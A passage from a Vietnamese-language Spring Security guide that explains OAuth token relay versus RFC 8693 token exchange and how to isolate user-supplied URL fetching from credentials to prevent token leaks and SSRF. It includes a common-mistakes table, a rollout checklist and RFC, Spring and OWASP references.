### 18.2. Downstream khác audience: token exchange

~~~text
Client
  |
  | T_A (aud=api-a)
  v
API A
  |
  +-- authorize user + operation
  |
  +-- server policy chooses resource B
  |
  +-- RFC 8693 exchange at AS
          |
          v
       T_B (aud=B, reduced scope)
          |
          v
       API B
~~~

### 18.3. Fetch URL do user nhập: không có OAuth credential

~~~text
Client -> Application -> URL Fetcher (no user token)
                               |
                               +-- URL/SSRF/egress policy
                               +-- no cookies/secrets
                               +-- redirects disabled/validated
                               |
                               v
                         untrusted response
                               |
                               v
                         parse and validate
~~~

Ba flow có mục đích khác nhau. Không dùng URL fetcher để thay token exchange và không dùng token relay để thực hiện arbitrary URL fetch.

## 19. Những sai lầm thường gặp

| Sai lầm | Hậu quả | Cách đúng |
| --- | --- | --- |
| Gửi incoming Bearer token tới URL từ request. | Token exfiltration. | Downstream registry server-side. |
| Nghĩ audience sai sẽ tự bảo vệ token. | Host vẫn nhận/lưu raw credential. | Kiểm soát recipient trước khi gửi. |
| Dùng `WebClient.baseUrl` rồi cho phép absolute URI. | Absolute URI có thể thay base URL. | Adapter hẹp, relative paths, không nhận URI tùy ý. |
| Cho caller chọn OAuth client registration ID. | Dùng nhầm client có quyền rộng. | Mapping operation → registration trong server policy. |
| Chuyển token tới resource khác thay vì exchange. | Token audience/scope không đúng. | RFC 8693/token dành riêng cho resource. |
| Cho caller tự chọn audience trong token exchange. | Backend trở thành token minting deputy. | Allowlist resource IDs và authorization. |
| Dùng ID Token như API credential. | Sai token purpose/audience. | Chỉ dùng Access Token theo resource contract. |
| Forward Refresh Token. | Lộ credential có thể mint token mới. | Không relay; giữ trong OAuth client lifecycle. |
| Follow redirects cùng Authorization header. | Credential sang origin khác. | Disable/validate redirects và strip credentials. |
| Chỉ validate URL bằng startsWith. | Bypass hostname/userinfo/port/encoding. | URI parser + canonicalization + allowlist. |
| DNS check một lần rồi connect tự do. | DNS rebinding/SSRF. | Egress firewall và resolved-address controls. |
| Tắt TLS hostname verification khi pin IP. | Mất server authentication. | Giữ TLS verification. |
| Tin X-Forwarded-* từ internet. | Spoof route/host. | Chỉ tin proxy được cấu hình. |
| Log Authorization header để debug. | Credential leak. | Redaction và correlation metadata. |
| Dùng service credential thay user mà không authorization. | Confused deputy, quyền rộng. | Kiểm tra operation/user/tenant trước khi gọi. |
| Dùng token relay cho downstream khác audience. | Downstream từ chối hoặc token bị lộ. | Token exchange/downscoping. |
| Cho URL fetcher dùng default WebClient có OAuth filter. | URL fetch vô tình mang token. | Client riêng, không credential filter. |

## 20. Lộ trình triển khai

1. **Liệt kê downstream resources:** base URI, issuer, audience, scopes, client registration và owner của từng integration.
2. **Thiết kế API theo operation:** nhận business identifiers/enum, không nhận raw URL làm token recipient.
3. **Kiểm tra authorization trước outbound call:** user, tenant, operation và object-level permissions.
4. **Chọn relay hay exchange:** relay chỉ khi token hiện tại vốn dành cho downstream; exchange khi cần token mới/resource khác.
5. **Quản lý OAuth client registration:** server-side configuration, least privilege, secrets từ secret manager.
6. **Giữ WebClient theo downstream:** fixed base URI, adapter hẹp, relative path; không expose arbitrary absolute URI.
7. **Kiểm soát redirect và proxy:** không chuyển Authorization sang origin mới, tin đúng gateway và network egress.
8. **Tách URL fetcher:** không dùng user token/cookie/client secret; SSRF validation, DNS/IP controls và response limits.
9. **Bảo vệ observability:** redact Authorization/Cookie/token fields, không log raw upstream bodies.
10. **Kiểm thử recipient:** attacker host, private IP, redirect, DNS rebinding, token exchange audience tampering và logging.
11. **Theo dõi outbound traffic:** downstream registration, status/latency, egress denials và token-exchange failures.
12. **Rà soát mọi đường gọi HTTP:** WebClient, RestClient, RestTemplate còn tồn tại, Feign, Gateway filters, scheduled jobs và message consumers.

**Ghi nhớ:** Backend không được dùng quyền và credential của mình để gửi Access Token đến **URL do caller tùy ý chọn**. Token relay chỉ chuyển tiếp token hiện tại tới downstream đã được tin cậy và có audience/scope phù hợp; nếu cần gọi resource khác, dùng **OAuth Token Exchange** để Authorization Server phát token mới theo policy. Nếu nghiệp vụ cần fetch URL người dùng nhập, tách một fetcher không mang OAuth credentials và bảo vệ nó khỏi SSRF. Kiểm soát recipient, redirect, DNS/egress, authorization và logging là một phần của cùng ranh giới bảo mật.

## Tài liệu tham khảo

- [RFC 6750 — OAuth 2.0 Bearer Token Usage](https://www.rfc-editor.org/rfc/rfc6750).
- [RFC 6749 — The OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749).
- [RFC 8693 — OAuth 2.0 Token Exchange](https://www.rfc-editor.org/rfc/rfc8693).
- [RFC 8707 — Resource Indicators for OAuth 2.0](https://www.rfc-editor.org/rfc/rfc8707).
- [RFC 9700 — Best Current Practice for OAuth 2.0 Security](https://www.rfc-editor.org/rfc/rfc9700).
- [Spring Security — Servlet OAuth2 Client](https://docs.spring.io/spring-security/reference/servlet/oauth2/client/index.html).
- [Spring Security — OAuth2 Resource Server](https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/index.html).
- [Spring Security — ServletBearerExchangeFilterFunction API](https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/server/resource/web/reactive/function/client/ServletBearerExchangeFilterFunction.html).
- [Spring Security — OAuth2AuthorizedClientManager API](https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/OAuth2AuthorizedClientManager.html).
- [Spring Cloud Gateway — TokenRelay GatewayFilter Factory](https://docs.spring.io/spring-cloud-gateway/reference/spring-cloud-gateway-server-webflux/gatewayfilter-factories/tokenrelay-factory.html).
- [OWASP — Server Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
- [OWASP — Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html).
